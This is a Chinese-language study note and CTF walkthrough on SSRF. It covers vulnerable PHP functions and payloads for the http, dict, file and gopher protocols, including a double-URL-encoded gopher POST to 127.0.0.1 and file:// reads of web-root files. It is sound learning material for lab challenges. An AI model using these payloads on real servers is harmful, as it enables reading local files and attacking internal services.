# 前言
之前的时候，对SSRF的了解仅限与概念，至于具体的利用方法，和绕过，都是没有什么概念的，这一次，将之前没有学到的东西好好学习一下，总结一下。
# 什么是SSRF
SSRF(服务端请求伪造漏洞)
由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。
一般情况下，SSRF针对的都是一些外网无法访问的内网，所以需要SSRF使目标后端去访问内网，进而达到我们攻击内网的目的。
通过SSRF，我们可以访问目标内网的redis服务，mysql服务，smpt服务，fastcgi服务等
造成漏洞的一些函数
`file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。`
`readfile()：输出一个文件的内容。`
`fsockopen()：打开一个网络连接或者一个Unix 套接字连接。`
`curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close()
函数使用。`
`fopen()：打开一个文件文件或者 URL。`
**file_get_contents()/readfile()**
**fsockopen()**
`fsockopen($hostname,$port,$errno,$errstr,$timeout)`用于打开一个网络连接或者一个Unix
套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。
fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false
    \n";
    } else {
        $out = "GET / HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);
        while (!feof($fp)) {
            echo fgets($fp, 128);
        }
        fclose($fp);
    }
    ?>
**curl_exec()**
接下来我就SSRF涉及的协议和一些bypass结合一些CTF进行分析
## SSRF攻击中涉及的一些协议
因为只是展示各个协议的用途，所以这里就不自己搭环境，直接用CTFHUB的技能树了
### http协议
**题目描述：** 尝试访问位于127.0.0.1的flag.php吧
payload： `?url=http://127.0.0.1/flag.php`
这就是因为过滤 不严谨，导致我们可以访问内网。
### dict协议
_在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。_
**题目描述：** 来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦
通过题目应该可以判断 ，跟上一道题是差不多的，但是就是端口问题
先判断哪个端口存在web服务
这里是直接用burp爆破端口就可以
但是我估计环境出问题了，一直没有爆破出想要的端口。
这里如果爆破出的话，直接访问就行
### file伪协议
**题目描述：** 尝试去读取一下Web目录下的flag.php吧
file为协议就不用多说了
payload：`?url=file:/var/www/html/flag.php`
但是需要知道文件具体位置才能读到敏感信息。
### Gopher协议
_Gopher是Internet上一个非常有名的信息查找系统，它将Internet
上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的
&也需要进行URL编码_  
_在SSRF中经常会使用Gopher来构造GET/POST包攻击应用。_
**题目描述：** 这次是发一个HTTP
POST请求。对了，ssrf是用php的curl实现的。并且会跟踪302跳转，我准备了一个302.php，可能对你有用哦。
进入题目直接查看源码
`?url=file:/var/www/html/flag.php 和 ?url=file:/var/www/html/index.php`
index.php
这里告诉我们要去用127.0.0.1访问flag.php
那道key，看这个样子是要我们POST key，但是提交页面又没有提交的按钮，所以这里就需要我们去本地新建一个POST
这里我们需要构造一个POST的数据包
    gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1
    Host: 127.0.0.1:80
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36
    key=00f001523d0b955749ea5e3b0ca09b5f
然后我们就可以进行url编码了，编码次数取决于我们访问次数。
第一次编码：
    gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2036%0A%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7
把%0A替换成%0d%0A，结尾加上%0d%0A,并且末尾要加上%0d%0a（\r\n）
    gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7%0d%0a
然后在进行一次URL编码
    gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Df1688c97bf2e6dda47be87e4d8f87cd7%250D%250A
当然手动编码，加上复杂的转化，错误率大大提高，所以，我在网上找了个脚本
    import urllib.parse
    payload =\
    """POST /flag.php HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36